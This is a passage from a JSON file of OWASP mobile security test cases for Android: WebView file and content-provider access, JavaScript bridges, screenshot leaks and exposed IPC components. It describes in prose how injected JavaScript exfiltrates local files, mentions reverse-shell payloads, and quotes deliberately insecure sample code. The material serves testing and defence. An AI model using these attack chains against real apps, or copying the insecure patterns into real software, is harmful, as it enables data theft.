setJavaScriptEnabled(true) and setAllowFileAccessFromFileURLs(true), the JavaScript in the malicious file (running in a file:// context) is able to access other local files using file:// URLs.</li><li>The attacker-controlled script exfiltrates sensitive data from the device to an external server.</li></ol><p><strong>Note 1</strong>: Either setAllowFileAccessFromFileURLs or setAllowUniversalAccessFromFileURLs must be set to true for the attack to work. If both settings are set to false, the following error will appear in logcat:</p><pre>[INFO:CONSOLE(0)] \"Access to XMLHttpRequest at 'file:///data/data/org.owasp.mastestapp/files/api-key.txt' from origin 'null' has been blocked by CORS policy: Cross origin requests are only supported for protocol schemes: http, data, chrome, https, chrome-untrusted.\", source: file:/// (0)\n[INFO:CONSOLE(31)] \"File content sent successfully.\", source: file:/// (31)\n</pre><p>And the server would not receive the file content:</p><pre>[*] Received POST data from 127.0.0.1:\n\nError reading file: 0\n</pre><p><strong>Note 2</strong>: As indicated in the Android docs, the value of <strong><a href=\"https://developer.android.com/reference/android/webkit/WebSettings#setAllowFileAccessFromFileURLs(boolean)\" rel=\"noopener noreferrer\" target=\"_blank\">setAllowFileAccessFromFileURLs is ignored</a></strong><a href=\"https://developer.android.com/reference/android/webkit/WebSettings#setAllowFileAccessFromFileURLs(boolean)\" rel=\"noopener noreferrer\" target=\"_blank\"> ↗</a> if allowUniversalAccessFromFileURLs=true.</p><h2></h2><h2>Steps</h2><ol><li>Determine the minSdkVersion of the app.</li><li>Use a tool like semgrep to search for references to:<ul><li>the WebView class.</li><li>the WebSettings class.</li><li>the setJavaScriptEnabled method.</li><li>the setAllowFileAccess, setAllowFileAccessFromFileURLs, and setAllowUniversalAccessFromFileURLs methods from the WebSettings class.</li></ul></li></ol><p>Note that in this case <strong>the lack of references to the setAllow* methods is especially interesting</strong> and must be captured, because it could mean that the app is using the default values, which in some scenarios are insecure. For this reason, it's highly recommended to try to identify every WebView instance in the app.</p><h2></h2><h2>Observation</h2><p>The output should contain a list of WebView instances where the abovementioned methods are used.</p><h2></h2><h2>Evaluation</h2><p>The evaluation of this test is based on the <a href=\"https://mas.owasp.org/MASTG/0x05h-Testing-Platform-Interaction/#webview-local-file-access-settings\" rel=\"noopener noreferrer\" target=\"_blank\">API behavior across different Android versions</a>.</p><p><strong>Fail:</strong></p><p>The test fails if:</p><ul><li>setJavaScriptEnabled is explicitly set to true.</li><li>setAllowFileAccess is explicitly set to true (or not used at all when minSdkVersion &lt; 30, inheriting the default value, true).</li><li>Either setAllowFileAccessFromFileURLs or setAllowUniversalAccessFromFileURLs is explicitly set to true (or not used at all when minSdkVersion &lt; 16, inheriting the default value, true).</li></ul><p><strong>Pass:</strong></p><p>The test passes if:</p><ul><li>setJavaScriptEnabled is explicitly set to false.</li><li>setAllowFileAccess is explicitly set to false (or not used at all when minSdkVersion &gt;= 30, inheriting the default value, false).</li><li>Both setAllowFileAccessFromFileURLs and setAllowUniversalAccessFromFileURLs are explicitly set to false (or not used at all when minSdkVersion &gt;= 16, inheriting the default value, false).</li></ul><h2></h2><h2>Mitigations</h2><ul><li><em><a href=\"https://mas.owasp.org/MASTG-BEST-0010\" rel=\"noopener noreferrer\" target=\"_blank\"> Use Up-to-Date minSdkVersion</a></em></li><li><em><a href=\"https://mas.owasp.org/MASTG-BEST-0011\" rel=\"noopener noreferrer\" target=\"_blank\"> Securely Load File Content in a WebView</a></em></li><li><em><a href=\"https://mas.owasp.org/MASTG-BEST-0012\" rel=\"noopener noreferrer\" target=\"_blank\"> Disable JavaScript in WebViews</a></em></li></ul>",
        "code": "MASTG-TEST-0252",
        "sort_order": 70
    },
    {
        "tags":
        [
            "MASTG-TEST-0250: References to Content Provider Access in WebViews"
        ],
        "testcase": "References to Content Provider Access in WebViews",
        "details": "<h2>Overview</h2><p>This test checks for references to Content Provider access in WebViews which is enabled by default and can be disabled using the setAllowContentAccess method in the WebSettings class. If improperly configured, this can introduce security risks such as unauthorized file access and data exfiltration.</p><p>The JavaScript code would have access to any content providers on the device such as:</p><ul><li>declared by the app, <strong>even if they are not exported</strong>.</li><li>declared by other apps, <strong>only if they are exported</strong> and if they are not following recommended <a href=\"https://developer.android.com/privacy-and-security/security-tips#content-providers\" rel=\"noopener noreferrer\" target=\"_blank\">best practices ↗</a> to restrict access.</li></ul><p>Refer to <a href=\"https://mas.owasp.org/MASTG/0x05h-Testing-Platform-Interaction/#webview-content-provider-access\" rel=\"noopener noreferrer\" target=\"_blank\">WebView Content Provider Access</a> for more information on the setAllowContentAccess method, the specific files that can be accessed and the conditions under which they can be accessed.</p><p><strong>Example Attack Scenario:</strong></p><p>Suppose a banking app uses a WebView to display dynamic content. The developers have not explicitly set the setAllowContentAccess method, so it defaults to true. Additionally, JavaScript is enabled in the WebView as well as the setAllowUniversalAccessFromFileURLs method.</p><ol><li>An attacker exploits a vulnerability (such as an XSS flaw) to inject malicious JavaScript into the WebView. This could occur through a compromised or malicious link that the WebView loads without proper validation.</li><li>Thanks to setAllowUniversalAccessFromFileURLs(true), the malicious JavaScript can issue requests to content:// URIs to read locally stored files or data exposed by content providers. Even those content providers from the app that are not exported can be accessed because the malicious code is running in the same process and same origin as the trusted code.</li><li>The attacker-controlled script exfiltrates sensitive data from the device to an external server.</li></ol><p><strong>Note 1:</strong> We do not consider minSdkVersion since setAllowContentAccess defaults to true regardless of the Android version.</p><p><strong>Note 2:</strong> The provider's android:grantUriPermissions attribute is irrelevant in this scenario as it does not affect the app itself accessing its own content providers. It allows <strong>other apps</strong> to temporary access URIs from the provider even though restrictions such as permission attributes, or android:exported=\"false\" are set. Also, if the app uses a FileProvider, the android:grantUriPermissions attribute must be set to true by <a href=\"https://developer.android.com/reference/androidx/core/content/FileProvider#:~:text=Set%20the%20android:grantUriPermissions%20attribute%20to%20true%2C%20to%20allow%20you%20to%20grant%20temporary%20access%20to%20files.%20\" rel=\"noopener noreferrer\" target=\"_blank\">definition ↗</a> (otherwise you'll get a SecurityException: Provider must grant uri permissions\").</p><p><strong>Note 3:</strong> allowUniversalAccessFromFileURLs is critical in the attack since it relaxes the default restrictions, allowing pages loaded from file:// to access content from any origin, including content:// URIs.</p><p>If this setting is not enabled, the following error will appear in logcat:</p><pre>[INFO:CONSOLE(0)] \"Access to XMLHttpRequest at 'content://org.owasp.mastestapp.provider/sensitive.txt'\nfrom origin 'null' has been blocked by CORS policy: Cross origin requests are only supported\nfor protocol schemes: http, data, chrome, https, chrome-untrusted.\", source: file:/// (0)\n</pre><p>While the fetch request to the external server would still work, retrieving the file content via content:// would fail.</p><h2></h2><h2>Steps</h2><ol><li>Use a tool like semgrep to search for references to:<ul><li>the WebView class.</li><li>the WebSettings class.</li><li>the setJavaScriptEnabled method.</li><li>the setAllowContentAccess method from the WebSettings class.</li><li>the setAllowUniversalAccessFromFileURLs method from the WebSettings class.</li></ul></li><li>Obtain all content providers declared in the app's AndroidManifest.xml file.</li></ol><h2></h2><h2>Observation</h2><p>The output should contain:</p><ul><li>A list of WebView instances including the following methods and their arguments:<ul><li>setAllowContentAccess</li><li>setJavaScriptEnabled</li><li>setAllowUniversalAccessFromFileURLs</li></ul></li><li>A list of content providers declared in the app's AndroidManifest.xml file.</li></ul><h2></h2><h2>Evaluation</h2><p><strong>Fail:</strong></p><p>The test fails if all of the following are true:</p><ul><li>setJavaScriptEnabled is explicitly set to true.</li><li>setAllowContentAccess is explicitly set to true or <em>not used at all</em> (inheriting the default value, true).</li><li>setAllowUniversalAccessFromFileURLs method is explicitly set to true.</li></ul><p>You should use the list of content providers obtained in the observation step to verify if they handle sensitive data.</p><p><strong>Note:</strong> The setAllowContentAccess method being set to true does not represent a security vulnerability by itself, but it can be used in combination with other vulnerabilities to escalate the impact of an attack. Therefore, it is recommended to explicitly set it to false if the app does not need to access content providers.</p><p><strong>Pass:</strong></p><p>The test passes if any of the following are true:</p><ul><li>setJavaScriptEnabled is explicitly set to false or <em>not used at all</em> (inheriting the default value, false).</li><li>setAllowContentAccess method is explicitly set to false.</li><li>setAllowUniversalAccessFromFileURLs method is explicitly set to false.</li></ul><h2></h2><h2>Mitigations</h2><ul><li><em><a href=\"https://mas.owasp.org/MASTG-BEST-0011\" rel=\"noopener noreferrer\" target=\"_blank\"> Securely Load File Content in a WebView</a></em></li><li><em><a href=\"https://mas.owasp.org/MASTG-BEST-0012\" rel=\"noopener noreferrer\" target=\"_blank\"> Disable JavaScript in WebViews</a></em></li><li><em><a href=\"https://mas.owasp.org/MASTG-BEST-0013\" rel=\"noopener noreferrer\" target=\"_blank\"> Disable Content Provider Access in WebViews</a></em></li></ul>",
        "code": "MASTG-TEST-0250",
        "sort_order": 68
    },
    {
        "tags":
        [
            "MASTG-TEST-0251: Runtime Use of Content Provider Access APIs in WebViews"
        ],
        "testcase": "Runtime Use of Content Provider Access APIs in WebViews",
        "details": "<h2>Overview</h2><p>This test is the dynamic counterpart to <em><a href=\"https://mas.owasp.org/MASTG-TEST-0250\" rel=\"noopener noreferrer\" target=\"_blank\"> References to Content Provider Access in WebViews</a></em>.</p><h2></h2><h2>Steps</h2><ol><li>Run a dynamic analysis tool like <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0039\" rel=\"noopener noreferrer\" target=\"_blank\"> Frida for iOS</a></em> and either:<ul><li>enumerate instances of WebView in the app and list their configuration values</li><li>or explicitly hook the setters of the WebView settings</li></ul></li></ol><h2></h2><h2>Observation</h2><p>The output should contain a list of WebView instances and corresponding settings.</p><h2></h2><h2>Evaluation</h2><p><strong>Fail:</strong></p><p>The test fails if all of the following are true:</p><ul><li>JavaScriptEnabled is true.</li><li>AllowContentAccess is true.</li><li>AllowUniversalAccessFromFileURLs is true.</li></ul><p>You should use the list of content providers obtained in <em><a href=\"https://mas.owasp.org/MASTG-TEST-0250\" rel=\"noopener noreferrer\" target=\"_blank\"> References to Content Provider Access in WebViews</a></em> to verify if they handle sensitive data.</p><p><strong>Note:</strong> AllowContentAccess being true does not represent a security vulnerability by itself, but it can be used in combination with other vulnerabilities to escalate the impact of an attack. Therefore, it is recommended to explicitly set it to false if the app does not need to access content providers.</p><p><strong>Pass:</strong></p><p>The test passes if any of the following are true:</p><ul><li>JavaScriptEnabled is false.</li><li>AllowContentAccess is false.</li><li>AllowUniversalAccessFromFileURLs is false.</li></ul><h2></h2><h2>Mitigations</h2><ul><li><em><a href=\"https://mas.owasp.org/MASTG-BEST-0011\" rel=\"noopener noreferrer\" target=\"_blank\"> Securely Load File Content in a WebView</a></em></li><li><em><a href=\"https://mas.owasp.org/MASTG-BEST-0012\" rel=\"noopener noreferrer\" target=\"_blank\"> Disable JavaScript in WebViews</a></em></li><li><em><a href=\"https://mas.owasp.org/MASTG-BEST-0013\" rel=\"noopener noreferrer\" target=\"_blank\"> Disable Content Provider Access in WebViews</a></em></li></ul>",
        "code": "MASTG-TEST-0251",
        "sort_order": 69
    },
    {
        "tags":
        [
            "MASTG-TEST-0037: Testing WebViews Cleanup"
        ],
        "testcase": "Testing WebViews Cleanup",
        "details": "<h2>Overview</h2><p>To test for <a href=\"https://mas.owasp.org/MASTG/0x05h-Testing-Platform-Interaction/#webviews-cleanup\" rel=\"noopener noreferrer\" target=\"_blank\">WebViews cleanup</a> you should inspect all APIs related to WebView data deletion and try to fully track the data deletion process.</p><h2></h2><h2>Static Analysis</h2><p>Start by identifying the usage of the following WebView APIs and carefully validate the mentioned best practices.</p><ul><li><strong>Initialization</strong>: an app might be initializing the WebView in a way to avoid storing certain information by using setDomStorageEnabled, setAppCacheEnabled or setDatabaseEnabled from <a href=\"https://developer.android.com/reference/android/webkit/WebSettings\" rel=\"noopener noreferrer\" target=\"_blank\">android.webkit.WebSettings ↗</a>. The DOM Storage (for using the HTML5 local storage), Application Caches and Database Storage APIs are disabled by default, but apps might set these settings explicitly to \"true\".</li><li><strong>Cache</strong>: Android's WebView class offers the <a href=\"https://developer.android.com/reference/android/webkit/WebView#clearCache(boolean)\" rel=\"noopener noreferrer\" target=\"_blank\">clearCache ↗</a> method which can be used to clear the cache for all WebViews used by the app. It receives a boolean input parameter (includeDiskFiles) which will wipe all stored resource including the RAM cache. However if it's set to false, it will only clear the RAM cache. Check the app for usage of the clearCache method and verify its input parameter. Additionally, you may also check if the app is overriding onRenderProcessUnresponsive for the case when the WebView might become unresponsive, as the clearCache method might also be called from there.</li><li><strong>WebStorage APIs</strong>: <a href=\"https://developer.android.com/reference/android/webkit/WebStorage#deleteAllData\" rel=\"noopener noreferrer\" target=\"_blank\">WebStorage.deleteAllData ↗</a> can be also used to clear all storage currently being used by the JavaScript storage APIs, including the Web SQL Database and the HTML5 Web Storage APIs.</li><li>Some apps will <em>need</em> to enable the DOM storage in order to display some HTML5 sites that use local storage. This should be carefully investigated as this might contain sensitive data.</li><li><strong>Cookies</strong>: any existing cookies can be deleted by using <a href=\"https://developer.android.com/reference/android/webkit/CookieManager#removeAllCookies(android.webkit.ValueCallback%3Cjava.lang.Boolean%3E)\" rel=\"noopener noreferrer\" target=\"_blank\">CookieManager.removeAllCookies ↗</a>.</li><li><strong>File APIs</strong>: proper data deletion in certain directories might not be that straightforward, some apps use a pragmatic solution which is to <em>manually</em> delete selected directories known to hold user data. This can be done using the java.io.File API such as <a href=\"https://kotlinlang.org/api/latest/jvm/stdlib/kotlin.io/java.io.-file/delete-recursively.html\" rel=\"noopener noreferrer\" target=\"_blank\">java.io.File.deleteRecursively ↗</a>.</li></ul><p><strong>Example:</strong></p><p>This example in Kotlin from the <a href=\"https://github.com/mozilla-mobile/focus-android/blob/v8.17.1/app/src/main/java/org/mozilla/focus/webview/SystemWebView.kt#L220\" rel=\"noopener noreferrer\" target=\"_blank\">open source Firefox Focus ↗</a> app shows different cleanup steps:</p><pre>override fun cleanup() {\n    clearFormData() // Removes the autocomplete popup from the currently focused form field, if present. Note this only affects the display of the autocomplete popup, it does not remove any saved form data from this WebView's store. To do that, use WebViewDatabase#clearFormData.\n    clearHistory()\n    clearMatches()\n    clearSslPreferences()\n    clearCache(true)\n\n    CookieManager.getInstance().removeAllCookies(null)\n\n    WebStorage.getInstance().deleteAllData() // Clears all storage currently being used by the JavaScript storage APIs. This includes the Application Cache, Web SQL Database and the HTML5 Web Storage APIs.\n\n    val webViewDatabase = WebViewDatabase.getInstance(context)\n    // It isn't entirely clear how this differs from WebView.clearFormData()\n    @Suppress(\"DEPRECATION\")\n    webViewDatabase.clearFormData() // Clears any saved data for web forms.\n    webViewDatabase.clearHttpAuthUsernamePassword()\n\n    deleteContentFromKnownLocations(context) // calls FileUtils.deleteWebViewDirectory(context) which deletes all content in \"app_webview\".\n}\n</pre><p>The function finishes with some extra <em>manual</em> file deletion in deleteContentFromKnownLocations which calls functions from <a href=\"https://github.com/mozilla-mobile/focus-android/blob/v8.17.1/app/src/main/java/org/mozilla/focus/utils/FileUtils.kt\" rel=\"noopener noreferrer\" target=\"_blank\">FileUtils ↗</a>. These functions use the <a href=\"https://kotlinlang.org/api/latest/jvm/stdlib/kotlin.io/java.io.-file/delete-recursively.html\" rel=\"noopener noreferrer\" target=\"_blank\">java.io.File.deleteRecursively ↗</a> method to recursively delete files from the specified directories.</p><pre>private fun deleteContent(directory: File, doNotEraseWhitelist: Set&lt;String&gt; = emptySet()): Boolean {\n    val filesToDelete = directory.listFiles()?.filter { !doNotEraseWhitelist.contains(it.name) } ?: return false\n    return filesToDelete.all { it.deleteRecursively() }\n}\n</pre><h2></h2><h2>Dynamic Analysis</h2><p>Open a WebView accessing sensitive data and then log out of the application. Access the application's storage container and make sure all WebView related files are deleted. The following files and folders are typically related to WebViews:</p><ul><li>app_webview</li><li>Cookies</li><li>pref_store</li><li>blob_storage</li><li>Session Storage</li><li>Web Data</li><li>Service Worker</li></ul>",
        "code": "MASTG-TEST-0037",
        "sort_order": 67
    },
    {
        "tags":
        [
            "MASTG-TEST-0033: Testing for Java Objects Exposed Through WebViews"
        ],
        "testcase": "Testing for Java Objects Exposed Through WebViews",
        "details": "<h2>Overview</h2><p>To test for <a href=\"https://mas.owasp.org/MASTG/0x05h-Testing-Platform-Interaction/#java-objects-exposed-through-webviews\" rel=\"noopener noreferrer\" target=\"_blank\">Java objects exposed through WebViews</a> check the app for WebViews having JavaScript enabled and determine whether the WebView is creating any JavaScript interfaces aka. \"JavaScript Bridges\". Finally, check whether an attacker could potentially inject malicious JavaScript code.</p><h2></h2><h2>Static Analysis</h2><p>The following example shows how addJavascriptInterface is used to bridge a Java Object and JavaScript in a WebView:</p><pre>WebView webview = new WebView(this);\nWebSettings webSettings = webview.getSettings();\nwebSettings.setJavaScriptEnabled(true);\n\nMSTG_ENV_008_JS_Interface jsInterface = new MSTG_ENV_008_JS_Interface(this);\n\nmyWebView.addJavascriptInterface(jsInterface, \"Android\");\nmyWebView.loadURL(\"http://example.com/file.html\");\nsetContentView(myWebView);\n</pre><p>In Android 4.2 (API level 17) and above, an annotation @JavascriptInterface explicitly allows JavaScript to access a Java method.</p><pre>public class MSTG_ENV_008_JS_Interface {\n\n        Context mContext;\n\n        /** Instantiate the interface and set the context */\n        MSTG_ENV_005_JS_Interface(Context c) {\n            mContext = c;\n        }\n\n        @JavascriptInterface\n        public String returnString () {\n            return \"Secret String\";\n        }\n\n        /** Show a toast from the web page */\n        @JavascriptInterface\n        public void showToast(String toast) {\n            Toast.makeText(mContext, toast, Toast.LENGTH_SHORT).show();\n        }\n}\n</pre><p>This is how you can call the method returnString from JavaScript, the string \"Secret String\" will be stored in the variable result:</p><pre>var result = window.Android.returnString();\n</pre><p>With access to the JavaScript code, via, for example, stored XSS or a MITM attack, an attacker can directly call the exposed Java methods.</p><p>If addJavascriptInterface is necessary, take the following considerations:</p><ul><li>Only JavaScript provided with the APK should be allowed to use the bridges, e.g. by verifying the URL on each bridged Java method (via WebView.getUrl).</li><li>No JavaScript should be loaded from remote endpoints, e.g. by keeping page navigation within the app's domains and opening all other domains on the default browser (e.g. Chrome, Firefox).</li><li>If necessary for legacy reasons (e.g. having to support older devices), at least set the minimal API level to 17 in the manifest file of the app (&lt;uses-sdk android:minSdkVersion=\"17\" /&gt;).</li></ul><h2></h2><h2>Dynamic Analysis</h2><p>Dynamic analysis of the app can show you which HTML or JavaScript files are loaded and which vulnerabilities are present. The procedure for exploiting the vulnerability starts with producing a JavaScript payload and injecting it into the file that the app is requesting. The injection can be accomplished via a MITM attack or direct modification of the file if it is stored in external storage. The whole process can be accomplished via Drozer and weasel (MWR's advanced exploitation payload), which can install a full agent, injecting a limited agent into a running process or connecting a reverse shell as a Remote Access Tool (RAT).</p><p>A full description of the attack is included in the blog article <a href=\"https://labs.withsecure.com/publications/webview-addjavascriptinterface-remote-code-execution/\" rel=\"noopener noreferrer\" target=\"_blank\">\"WebView addJavascriptInterface Remote Code Execution\" ↗</a>.</p>",
        "code": "MASTG-TEST-0033",
        "sort_order": 65
    },
    {
        "tags":
        [
            "MASTG-TEST-0010: Finding Sensitive Information in Auto-Generated Screenshots"
        ],
        "testcase": "Finding Sensitive Information in Auto-Generated Screenshots",
        "details": "<h2>Overview</h2><p></p><h2>Static Analysis</h2><p>A screenshot of the current activity is taken when an Android app goes into background and displayed for aesthetic purposes when the app returns to the foreground. However, this may leak sensitive information.</p><p>To determine whether the application may expose sensitive information via the app switcher, find out whether the <a href=\"https://developer.android.com/reference/android/view/Display.html#FLAG_SECURE\" rel=\"noopener noreferrer\" target=\"_blank\">FLAG_SECURE ↗</a> option has been set. You should find something similar to the following code snippet:</p><p>Example in Java:</p><pre>getWindow().setFlags(WindowManager.LayoutParams.FLAG_SECURE,\n                WindowManager.LayoutParams.FLAG_SECURE);\nsetContentView(R.layout.activity_main);\n</pre><p>Example in Kotlin:</p><pre>window.setFlags(WindowManager.LayoutParams.FLAG_SECURE,\n                WindowManager.LayoutParams.FLAG_SECURE)\nsetContentView(R.layout.activity_main)\n</pre><p>If the option has not been set, the application is vulnerable to screen capturing.</p><h2>Dynamic Analysis</h2><p>While black-box testing the app, navigate to any screen that contains sensitive information and click the home button to send the app to the background, then press the app switcher button to see the snapshot. As shown below, if FLAG_SECURE is set (left image), the snapshot will be empty; if the flag has not been set (right image), activity information will be shown:</p><p>On devices supporting <a href=\"https://source.android.com/security/encryption/file-based\" rel=\"noopener noreferrer\" target=\"_blank\">file-based encryption (FBE) ↗</a>, snapshots are stored in the /data/system_ce/&lt;USER_ID&gt;/&lt;IMAGE_FOLDER_NAME&gt; folder. &lt;IMAGE_FOLDER_NAME&gt; depends on the vendor but most common names are snapshots and recent_images. If the device doesn't support FBE, the /data/system/&lt;IMAGE_FOLDER_NAME&gt; folder is used.</p><p>Accessing these folders and the snapshots requires root.</p>",
        "code": "MASTG-TEST-0010",
        "sort_order": 61
    },
    {
        "tags":
        [
            "MASTG-TEST-0029: Testing for Sensitive Functionality Exposure Through IPC"
        ],
        "testcase": "Testing for Sensitive Functionality Exposure Through IPC",
        "details": "<h2>Overview</h2><p>To test for <a href=\"https://mas.owasp.org/MASTG/0x05h-Testing-Platform-Interaction/#sensitive-functionality-exposure-through-ipc\" rel=\"noopener noreferrer\" target=\"_blank\">sensitive functionality exposure through IPC</a> mechanisms you should first enumerate all the IPC mechanisms the app uses and then try to identify whether sensitive data is leaked when the mechanisms are used.</p><h2></h2><h2>Static Analysis</h2><p>We start by looking at the AndroidManifest.xml, where all activities, services, and content providers included in the app must be declared (otherwise the system won't recognize them and they won't run).</p><ul><li><a href=\"https://developer.android.com/guide/topics/manifest/intent-filter-element.html\" rel=\"noopener noreferrer\" target=\"_blank\">&lt;intent-filter&gt; ↗</a></li><li><a href=\"https://developer.android.com/guide/topics/manifest/service-element.html\" rel=\"noopener noreferrer\" target=\"_blank\">&lt;service&gt; ↗</a></li><li><a href=\"https://developer.android.com/guide/topics/manifest/provider-element.html\" rel=\"noopener noreferrer\" target=\"_blank\">&lt;provider&gt; ↗</a></li><li><a href=\"https://developer.android.com/guide/topics/manifest/receiver-element.html\" rel=\"noopener noreferrer\" target=\"_blank\">&lt;receiver&gt; ↗</a></li></ul><p>An \"exported\" activity, service, or content can be accessed by other apps. There are two common ways to designate a component as exported. The obvious one is setting the export tag to true android:exported=\"true\". The second way involves defining an &lt;intent-filter&gt; within the component element (&lt;activity&gt;, &lt;service&gt;, &lt;receiver&gt;). When this is done, the export tag is automatically set to \"true\". To prevent all other Android apps from interacting with the IPC component element, be sure that the android:exported=\"true\" value and an &lt;intent-filter&gt; aren't in their AndroidManifest.xml files unless this is necessary.</p><p>Remember that using the permission tag (android:permission) will also limit other applications' access to a component. If your IPC is intended to be accessible to other applications, you can apply a security policy with the &lt;permission&gt; element and set a proper android:protectionLevel. When android:permission is used in a service declaration, other applications must declare a corresponding &lt;uses-permission&gt; element in their own manifest to start, stop, or bind to the service.</p><p>For more information about the content providers, please refer to the test case \"Testing Whether Stored Sensitive Data Is Exposed via IPC Mechanisms\" in chapter \"Testing Data Storage\".</p><p>Once you identify a list of IPC mechanisms, review the source code to see whether sensitive data is leaked when the mechanisms are used. For example, content providers can be used to access database information, and services can be probed to see if they return data. Broadcast receivers can leak sensitive information if probed or sniffed.</p><p>In the following, we use two example apps and give examples of identifying vulnerable IPC components:</p><ul><li><a href=\"https://github.com/mwrlabs/drozer/releases/download/2.3.4/sieve.apk\" rel=\"noopener noreferrer\" target=\"_blank\">\"Sieve\" ↗</a></li><li><em><a href=\"https://mas.owasp.org/MASTG-APP-0010\" rel=\"noopener noreferrer\" target=\"_blank\"> InsecureBankv2</a></em></li></ul><h3>Activities</h3><p>Inspect the AndroidManifest</p><p>In the \"Sieve\" app, we find three exported activities, identified by &lt;activity&gt;:</p><pre>&lt;activity android:excludeFromRecents=\"true\" android:label=\"@string/app_name\" android:launchMode=\"singleTask\" android:name=\".MainLoginActivity\" android:windowSoftInputMode=\"adjustResize|stateVisible\"&gt;\n    &lt;intent-filter&gt;\n        &lt;action android:name=\"android.intent.action.MAIN\" /&gt;\n        &lt;category android:name=\"android.intent.category.LAUNCHER\" /&gt;\n    &lt;/intent-filter&gt;\n&lt;/activity&gt;\n&lt;activity android:clearTaskOnLaunch=\"true\" android:excludeFromRecents=\"true\" android:exported=\"true\" android:finishOnTaskLaunch=\"true\" android:label=\"@string/title_activity_file_select\" android:name=\".FileSelectActivity\" /&gt;\n&lt;activity android:clearTaskOnLaunch=\"true\" android:excludeFromRecents=\"true\" android:exported=\"true\" android:finishOnTaskLaunch=\"true\" android:label=\"@string/title_activity_pwlist\" android:name=\".PWList\" /&gt;\n</pre><p>Inspect the Source Code</p><p>By inspecting the PWList.java activity, we see that it offers options to list all keys, add, delete, etc. If we invoke it directly, we will be able to bypass the LoginActivity. More on this can be found in the dynamic analysis below.</p><h3>Services</h3><p>Inspect the AndroidManifest</p><p>In the \"Sieve\" app, we find two exported services, identified by &lt;service&gt;:</p><pre>&lt;service android:exported=\"true\" android:name=\".AuthService\" android:process=\":remote\" /&gt;\n&lt;service android:exported=\"true\" android:name=\".CryptoService\" android:process=\":remote\" /&gt;\n</pre><p>Inspect the Source Code</p><p>Check the source code for the class android.app.Service:</p><p>By reversing the target application, we can see that the service AuthService provides functionality for changing the password and PIN-protecting the target app.</p><pre>   public void handleMessage(Message msg) {\n            AuthService.this.responseHandler = msg.replyTo;\n            Bundle returnBundle = msg.obj;\n            int responseCode;\n            int returnVal;\n            switch (msg.what) {\n                ...\n                case AuthService.MSG_SET /*6345*/:\n                    if (msg.arg1 == AuthService.TYPE_KEY) /*7452*/ {\n                        responseCode = 42;\n                        if (AuthService.this.setKey(returnBundle.getString(\"com.mwr.example.sieve.PASSWORD\"))) {\n                            returnVal = 0;\n                        } else {\n                            returnVal = 1;\n                        }\n                    } else if (msg.arg1 == AuthService.TYPE_PIN) {\n                        responseCode = 41;\n                        if (AuthService.this.setPin(returnBundle.getString(\"com.mwr.example.sieve.PIN\"))) {\n                            returnVal = 0;\n                        } else {\n                            returnVal = 1;\n                        }\n                    } else {\n                        sendUnrecognisedMessage();\n                        return;\n                    }\n           }\n   }\n</pre><h3>Broadcast Receivers</h3><p>Inspect the AndroidManifest</p><p>In the \"Android Insecure Bank\" app, we find a broadcast receiver in the manifest, identified by &lt;receiver&gt;:</p><pre>&lt;receiver android:exported=\"true\" android:name=\"com.android.insecurebankv2.MyBroadCastReceiver\"&gt;\n    &lt;intent-filter&gt;\n        &lt;action android:name=\"theBroadcast\" /&gt;\n    &lt;/intent-filter&gt;\n&lt;/receiver&gt;\n</pre><p>Inspect the Source Code</p><p>Search the source code for strings like sendBroadcast, sendOrderedBroadcast, and sendStickyBroadcast. Make sure that the application doesn't send any sensitive data.</p><p>If an Intent is broadcasted and received within the application only, LocalBroadcastManager can be used to prevent other apps from receiving the broadcast message. This reduces the risk of leaking sensitive information.</p><p>To understand more about what the receiver is intended to do, we have to go deeper in our static analysis and search for usage of the class android.content.BroadcastReceiver and the Context.registerReceiver method, which is used to dynamically create receivers.</p><p>The following extract of the target application's source code shows that the broadcast receiver triggers transmission of an SMS message containing the user's decrypted password.</p><pre>public class MyBroadCastReceiver extends BroadcastReceiver {\n  String usernameBase64ByteString;\n  public static final String MYPREFS = \"mySharedPreferences\";\n\n  @Override\n  public void onReceive(Context context, Intent intent) {\n    // TODO Auto-generated method stub\n\n        String phn = intent.getStringExtra(\"phonenumber\");\n        String newpass = intent.getStringExtra(\"newpass\");\n\n    if (phn != null) {\n      try {\n                SharedPreferences settings = context.getSharedPreferences(MYPREFS, Context.MODE_WORLD_READABLE);\n                final String username = settings.getString(\"EncryptedUsername\", null);\n                byte[] usernameBase64Byte = Base64.decode(username, Base64.DEFAULT);\n                usernameBase64ByteString = new String(usernameBase64Byte, \"UTF-8\");\n                final String password = settings.getString(\"superSecurePassword\", null);\n                CryptoClass crypt = new CryptoClass();\n                String decryptedPassword = crypt.aesDeccryptedString(password);\n                String textPhoneno = phn.toString();\n                String textMessage = \"Updated Password from: \"+decryptedPassword+\" to: \"+newpass;\n                SmsManager smsManager = SmsManager.getDefault();\n                System.out.println(\"For the changepassword - phonenumber: \"+textPhoneno+\" password is: \"+textMessage);\nsmsManager.sendTextMessage(textPhoneno, null, textMessage, null, null);\n          }\n     }\n  }\n}\n</pre><p>BroadcastReceivers should use the android:permission attribute; otherwise, other applications can invoke them. You can use Context.sendBroadcast(intent, receiverPermission); to specify permissions a receiver must have to <a href=\"https://developer.android.com/reference/android/content/Context#sendBroadcast%28android.content.Intent,%20java.lang.String%29\" rel=\"noopener noreferrer\" target=\"_blank\">read the broadcast ↗</a>. You can also set an explicit application package name that limits the components this Intent will resolve to. If left as the default value (null), all components in all applications will be considered. If non-null, the Intent can match only the components in the given application package.</p><h2></h2><h2>Dynamic Analysis</h2><p>You can enumerate IPC components with <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0035\" rel=\"noopener noreferrer\" target=\"_blank\"> MobSF</a></em>. To list all exported IPC components, upload the APK file and the components collection will be displayed in the following screen:</p><h3>Content Providers</h3><p>The \"Sieve\" application implements a vulnerable content provider. To list the content providers exported by the Sieve app, execute the following command:</p><pre>$ adb shell dumpsys package com.mwr.example.sieve | grep -Po \"Provider{[\\w\\d\\s\\./]+}\" | sort -u\nProvider{34a20d5 com.mwr.example.sieve/.FileBackupProvider}\nProvider{64f10ea com.mwr.example.sieve/.DBContentProvider}\n</pre><p>Once identified, you can use <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0018\" rel=\"noopener noreferrer\" target=\"_blank\"> jadx</a></em> to reverse engineer the app and analyze the source code of the exported content providers to identify potential vulnerabilities.</p><p>To identify the corresponding class of a content provider, use the following information:</p><ul><li>Package Name: com.mwr.example.sieve.</li><li>Content Provider Class Name: DBContentProvider.</li></ul><p>When analyzing the class com.mwr.example.sieve.DBContentProvider, you'll see that it contains several URIs:</p><pre>package com.mwr.example.sieve;\n...\npublic class DBContentProvider extends ContentProvider {\n    